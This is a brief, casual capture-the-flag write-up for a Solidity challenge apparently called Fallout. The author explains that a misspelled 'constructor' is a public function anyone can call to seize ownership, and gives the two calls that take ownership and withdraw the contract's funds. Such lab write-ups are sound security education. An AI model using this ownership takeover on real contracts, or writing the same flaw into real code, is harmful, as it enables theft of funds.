This one was a piece of cake once I got the hang of constructors; In a nutshell, the constructor can be called as many times as one may wish:

```solidity
/* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

For some god forsaken reason, it sets the owner of the contract to the sender. why???

I don't even understand the purpose of this challenge; All I know is that 
```solidity
contract.Fal1out({from: player})
contract.collectAllocations()
```

is gucci. 
